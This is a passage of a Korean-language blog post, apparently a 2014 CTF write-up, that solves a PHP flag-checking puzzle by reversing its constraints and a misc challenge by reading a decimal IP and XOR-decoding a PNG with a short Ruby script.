</code></pre></div></div><p>위 코드로부터 아래의 것들을 유추할 수 있습니다.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">][</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"7"</span><span class="p">;</span>
<span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">][</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"o"</span><span class="p">;</span>
<span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">][</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"_"</span><span class="p">;</span>
<span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">][</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"d"</span><span class="p">;</span>
<span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">][</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"0"</span><span class="p">;</span>
</code></pre></div></div><p>그 다음은 <code class="highlighter-rouge">$flag_len</code>입니다.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$flag_len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">]);</span>
<span class="nv">$length_chk</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="nv">$flag_len</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="nv">$length_chk</span> <span class="o">+=</span> <span class="nv">$flag_len</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">if</span> <span class="p">((</span><span class="nv">$length_chk</span> <span class="o">&lt;</span> <span class="mi">110</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$length_chk</span> <span class="o">&gt;</span> <span class="mi">130</span><span class="p">))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
</code></pre></div></div><p><code class="highlighter-rouge">$_GET[flag]</code>가 16글자가 되어야 한다는 사실을 알 수 있습니다.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$stage3</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">],</span> <span class="o">-</span><span class="mi">7</span><span class="p">);</span>
<span class="nv">$stage3_1</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$stage3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
<span class="nv">$stage3_2</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$stage3</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
<span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">"stage3_"</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$stage3_1</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$stage3_2</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$tmp</span> <span class="o">!=</span> <span class="s2">"stage3_143193195211162158"</span><span class="p">)</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">"You did it!&lt;br&gt;Flag is {&lt;strong&gt;"</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"&lt;/strong&gt;}"</span><span class="p">;</span>
</code></pre></div></div><p><code class="highlighter-rouge">$_GET[flag]</code>의 뒤에서부터 7글자를 알아낼 수 있는데, 뒤에서 7번째 글자는 이미 <code class="highlighter-rouge">0</code>으로 정해져 있으므로 거기에서 <code class="highlighter-rouge">chr(143 - ord('0'))</code>은 <code class="highlighter-rouge">_</code>, <code class="highlighter-rouge">chr(193 - ord('_'))</code>은 <code class="highlighter-rouge">b</code>, …의 방식으로 끝까지 유추할 수 있습니다.</p><p>Flag는 <code class="highlighter-rouge">time_7o_d0_bar0n</code>입니다.</p><h2 id="trace">Trace - MISC100</h2><blockquote><p>Just Find a Key</p><p>Flag: 0xff<br /> 988087853 + k3y + IMG(png)</p><p>Hint: Its Decimal. u can change to Dotted Decimal.<br /> Hint2: its IP Address in Decimal. therefore =&gt; http://988087853/k3y.png and image has been encrypted. try decrypt</p></blockquote><p>988087853은 사실 IP 주소를 의미합니다. <a href="http://988087853">http://988087853</a>으로 접속하면 우리에게 익숙한 IP로 변환됩니다. <a href="http://58.229.6.45">http://58.229.6.45</a>군요. <code class="highlighter-rouge">/k3y.png</code> 파일을 <a href="/downloads/2014/12/26/k3y.png">받아 봅시다</a>. 헥스 에디터를 통해 파일을 보게 되면 첫 4바이트가 <code class="highlighter-rouge">0x76 0xAF 0xB1 0xB8</code>인데, <code class="highlighter-rouge">0xFF</code>와 XOR 해봅시다.</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="se">\x76\xAF\xB1\xB8</span><span class="s2">"</span><span class="p">.</span><span class="nf">bytes</span><span class="p">.</span><span class="nf">map</span> <span class="p">{</span> <span class="o">|</span><span class="n">b</span><span class="o">|</span> <span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="mh">0xFF</span><span class="p">).</span><span class="nf">chr</span> <span class="p">}</span>
<span class="c1"># =&gt; ["\x89", "P", "N", "G"]</span>
</code></pre></div></div><p>파일 전체가 <code class="highlighter-rouge">0xFF</code>와 XOR 되어 있는 상태입니다. XOR 하면 제대로 된 이미지를 볼 수 있습니다.</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s1">'k3y.png'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span>
<span class="n">f</span><span class="p">.</span><span class="nf">close</span>

<span class="n">xor</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s1">'k3y_xor.png'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">)</span>
<span class="n">xor</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">bytes</span><span class="p">.</span><span class="nf">map</span> <span class="p">{</span> <span class="o">|</span><span class="n">b</span><span class="o">|</span> <span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="mh">0xFF</span><span class="p">).</span><span class="nf">chr</span> <span class="p">}.</span><span class="nf">join</span><span class="p">)</span>
<span class="n">xor</span><span class="p">.</span><span class="nf">close</span>
</code></pre></div></div><p>그렇게 얻은 이미지는 아래와 같습니다.</p><p><img src="/images/2014/12/25/k3y_xor.png" alt="k3y_xor.png" title="k3y_xor.png" /></p><p>Flag는 <code class="highlighter-rouge">ASKY_ALWAYS!</code>입니다.</p></div></article></div></main><footer class="site-footer"><div class="wrapper"><p> Content on this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a><br /> &copy; 2013&ndash;2019 - <a href="/about/">Yous</a> - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://yous.be/atom.xml">RSS</a></p></div></footer>
